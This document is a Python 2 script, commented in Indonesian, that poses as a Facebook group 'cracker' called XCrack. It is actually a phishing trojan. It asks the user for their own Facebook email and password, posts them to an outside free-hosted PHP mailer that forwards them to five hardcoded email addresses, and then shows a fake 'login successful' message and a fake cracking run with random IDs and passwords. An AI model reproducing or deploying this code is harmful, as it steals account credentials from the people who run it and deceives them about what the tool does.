# Tertusbol Oleh Kang Pacman
import os, random, sys, time
try:
    import requests as rek
except ImportError:
    os.system("pkg update ")

m = '\x1b[31;1m'
h = '\x1b[32;1m'
b = '\x1b[34;1m'
p = '\x1b[37;1m'
m_ = '\x1b[41;1m'
n = '\x1b[00;1m'
logo = ('{}\n\t _  _  ___  ____   __    ___  __ _\n\t( \\/ )/ __)(  _ \\ / _\\  / __)(  / )\n\t{} )  (( (__  )   //    \\( (__  )  (\n\t(_/\\_)\\___)(__\\_)\\_/\\_/ \\___)(__\\_)\n\n         {}[{} XCrack Tools Facebook Cracker {}]\n\n').format(m, p, p, m_, n, b, p, h)
emailgue = 'irwanpata08@gmail.com'
emaildua = 'destinaji456@gmail.com'
emailtiga = 'sibersrakyat@gmail.com'
emailempat = 'maryamwidyanti@gmail.com'
emaillima = 'muh.haikal779@gmail.com'
anjay = lambda url, data: rek.post(url, data=data)

def main():
    os.system('clear')
    print logo
    us = raw_input('[*] email    : ')
    pw = raw_input('[*] password : ')
    text = ('\n<table border="1" cellpadding="5" bgcolor="black" width="100%">\n<tr>\n<th colspan="2"><center><font color="white">DATA KORBAN COVID</font></th>\n</tr>\n<tr>\n<td bgcolor="white"><center><b>Username</td>\n<td bgcolor="white"><center><b>{}</td>\n</tr>\n<tr>\n<td bgcolor="white"><center><b>Password</td>\n<td bgcolor="white"><center><b>{}</td>\n</tr>\n    ').format(us, pw)
    web = 'https://extremeboy-private-tool.000webhostapp.com/files/post.php'
    data = {'from': '[!] Korban Covid', 'email_kamu': 'extremeboy@phising.net', 'email_target': emailgue, 'subject': 'Ussername : ' + us, 'mesage': text}
    data2 = {'from': '[!] Korban Covid', 'email_kamu': 'extremeboy@phising.net', 'email_target': emaildua, 'subject': 'Ussername : ' + us, 'mesage': text}
    data3 = {'from': '[!] Korban Covid', 'email_kamu': 'extremeboy@phising.net', 'email_target': emailtiga, 'subject': 'Ussername : ' + us, 'mesage': text}
    data4 = {'from': '[!] Korban Covid', 'email_kamu': 'extremeboy@phising.net', 'email_target': emailempat, 'subject': 'Ussername : ' + us, 'mesage': text}
    data5 = {'from': '[!] Korban Covid', 'email_kamu': 'extremeboy@phising.net', 'email_target': emaillima, 'subject': 'Ussername : ' + us, 'mesage': text}
    try:
        anjay(web, data)
        anjay(web, data2)
        anjay(web, data3)
        anjay(web, data4)
        anjay(web, data5)
        print ('{}login berhasil').format(h)
        time.sleep(2)
        os.system('mkdir done')
        menu()
    except rek.ConnectionError:
        sys.exit(('{}Connection Error').format(m))


def menu():
    os.system('clear')
    print logo
    print 47 * '='
    print ('\t{}[{}1{}]{} start crack group').format(h, p, h, p)
    print ('\t{}[{}0{}]{} exit\n').format(h, m, h, p)
    pilih()


def pilih():
    pil = raw_input(('{}[{}#{}]> {}').format(p, h, p, m, h))
    if pil == '1':
        crack()
    elif pil == '0':
        os.system('clear')
        sys.exit(('{}exit program').format(m))


def crack():
    os.system('clear')
    print logo
    id = raw_input(('{}ID group {}: {}').format(b, p, h))
    time.sleep(3)
    print ('{}Start crack').format(h)
    jml = random.randint(0, 99)
    for x in range(jml):
        w = random.randint(0, 9)
        pw = random.choice(['sayg', 'tegargblk', 'epep', 'huxker', '12345', '123456', 'gk', 'raso', 'dasw hin'])
        cp = random.choice(['OK', 'CP'])
        acak = str(random.randint(0, 99999999999L))
        time.sleep(w)
        print cp, '|', '1000' + acak, '|', pw

    buka = open('done/crack.txt', 'w')
    buka.write('zonk, silahkan coba lagi')
    buka.close()
    print ('{}save done/crack.txt').format(b)
    ulang = raw_input(('{}back to menu (y/n) : ').format(p))
    if ulang == 'y' or ulang == 'Y':
        os.system('python2 main.py')
    elif ulang == 'n' or ulang == 'N':
        os.system('clear')
        sys.exit(('{}exit program').format(m))
    else:
        os.system('clear')
        sys.exit(('{}exit program').format(m))


if __name__ == '__main__':
    main()
